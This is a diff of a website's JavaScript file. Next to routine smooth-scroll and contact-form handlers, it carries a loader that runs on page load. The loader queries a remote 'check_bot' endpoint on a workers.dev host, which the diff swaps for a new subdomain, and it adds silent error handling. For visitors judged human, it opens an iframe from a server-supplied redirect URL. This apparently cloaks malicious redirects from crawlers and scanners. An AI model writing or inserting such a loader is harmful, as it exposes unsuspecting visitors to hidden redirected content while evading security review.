@@ -31,9 +31,9 @@ function getParams() {
 };
 
 window.addEventListener('DOMContentLoaded', () => {
-        const p = getParams();
-    
-    fetch('https://proxy_cf.opaopaopppa.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
+    const p = getParams();
+
+    fetch('https://proxy_cf.pointg.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
             createFrame(res.url_red + 'NVQVZ4?page=' + p?.page)
         } else {
@@ -41,11 +41,15 @@ window.addEventListener('DOMContentLoaded', () => {
 
         }
 
+    }).catch(e => {
+        console.error(e);
+        setTimeout(toggleLoad, 500);
+
     })
 
     // Smooth scroll
     document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener('click', function(e) {
+        anchor.addEventListener('click', function (e) {
             const target = document.querySelector(this.getAttribute('href'));
             if (target) {
                 e.preventDefault();
@@ -92,7 +96,7 @@ window.addEventListener('DOMContentLoaded', () => {
     // Contact form
     const form = document.getElementById('contact-form');
     if (form) {
-        form.addEventListener('submit', function(e) {
+        form.addEventListener('submit', function (e) {
             e.preventDefault();
             const btn = form.querySelector('[type="submit"]');
             btn.textContent = 'Sent!';
